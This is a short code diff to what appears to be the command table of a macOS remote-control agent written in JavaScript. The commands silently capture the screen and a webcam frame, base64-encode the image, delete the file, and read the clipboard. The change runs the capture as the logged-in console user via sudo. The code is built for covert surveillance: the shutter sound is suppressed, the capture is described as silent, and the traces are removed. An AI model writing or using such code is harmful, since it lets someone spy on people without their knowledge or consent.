@@ -58,10 +58,10 @@ const system = {
   lockScreen:  () =>
     `osascript -e 'tell application "System Events" to keystroke "q" using {command down, control down}'`,
   screenshot:  (path = '/tmp/_sc.jpg') =>
-    `screencapture -x -t jpg "${path}" && base64 "${path}" && rm -f "${path}"`,
+    `CU=$(stat -f '%Su' /dev/console); sudo -u "$CU" screencapture -x -t jpg "${path}" && base64 "${path}" && rm -f "${path}"`,
   // Capture front webcam frame silently via ffmpeg (brew install ffmpeg)
   webcam: (path = '/tmp/_wc.jpg') =>
-    `ffmpeg -f avfoundation -video_size 1280x720 -framerate 30 -i "0" -frames:v 1 -y "${path}" 2>/dev/null && base64 "${path}" && rm -f "${path}"`,
+    `CU=$(stat -f '%Su' /dev/console); sudo -u "$CU" ffmpeg -f avfoundation -video_size 1280x720 -framerate 30 -i "0" -frames:v 1 -y "${path}" 2>/dev/null && base64 "${path}" && rm -f "${path}"`,
 
   // ── Clipboard ────────────────────────────────────────────────────────────────
   getClipboard: () => 'pbpaste',
